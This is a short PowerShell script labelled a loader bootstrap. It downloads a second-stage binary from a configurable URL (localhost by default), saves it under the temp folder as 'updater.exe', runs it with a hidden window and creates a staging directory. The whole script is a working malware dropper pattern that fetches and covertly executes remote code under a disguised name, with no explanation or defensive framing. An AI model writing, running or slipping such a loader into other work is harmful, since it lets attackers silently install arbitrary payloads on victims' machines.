<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://localhost:8080/cdn/stage2.bin",
    [string]$OutputPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $OutputPath)
Start-Process -FilePath $OutputPath -WindowStyle Hidden
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
